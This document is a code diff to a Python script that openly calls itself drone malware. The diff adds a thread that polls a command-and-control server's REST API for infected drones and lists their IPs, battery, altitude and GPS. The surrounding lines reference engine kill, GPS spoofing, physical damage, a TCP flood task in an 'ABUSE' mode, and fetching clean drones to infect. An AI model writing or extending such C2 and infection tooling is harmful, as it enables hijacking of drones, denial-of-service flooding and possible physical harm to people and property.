@@ -146,6 +146,37 @@ engine_kill = False
 gps_spoof_active = False
 physical_damage_active = False
 
+def fetch_active_drones(c2_ip, web_port=9000):
+    try:
+        url = f"http://{c2_ip}:{web_port}/api/drones"
+        with urllib.request.urlopen(url, timeout=2) as res:
+            data = json.loads(res.read().decode("utf-8"))
+            return data.get("fleet", {})
+    except Exception as e:
+        print(f" {C_YELLOW}[!] Could not fetch active drones from C2 REST API: {e}{C_END}")
+        return {}
+
+def active_drones_monitor(c2_ip, web_port=9000):
+    while True:
+        fleet = fetch_active_drones(c2_ip, web_port)
+        
+        output = f"\n {C_BLUE}{C_BOLD}========== ACTIVE C2 DRONES FROM SERVER =========={C_END}\n"
+        output += f" {C_CYAN}Total Active:{C_END} {len(fleet)}\n"
+        
+        for drone_id, d in fleet.items():
+            output += (
+                f" {C_GREEN}{drone_id}{C_END} | IP: {d.get('ip')} | "
+                f"Batt: {d.get('battery')}% | Alt: {d.get('altitude')}m | "
+                f"Speed: {d.get('speed')} | GPS: {d.get('gps')} | "
+                f"Status: {d.get('status', 'ACTIVE')}\n"
+            )
+        output += f" {C_BLUE}{C_BOLD}=================================================={C_END}\n"
+        
+        with print_lock:
+            print(output, flush=True)
+            
+        time.sleep(3)
+
 def tcp_flood_task(c2_ip):
     while beacon_mode == "ABUSE":
         try:
@@ -505,6 +536,13 @@ def main():
     MALWARE_CONFIG["c2_port"] = port
     beacon_mode = random.choice(["NORMAL", "ABUSE"])
     print(f"\n {C_BLUE}[i]{C_END} Swarm profile calibrated to beacon mode: {C_BOLD}{beacon_mode}{C_END}")
+    
+    # Start monitor thread
+    threading.Thread(
+        target=active_drones_monitor,
+        args=(c2_ip, 9000),
+        daemon=True
+    ).start()
     
     # FETCH ACTIVE CLEAN DRONES TO INFECT
     active_drones = []
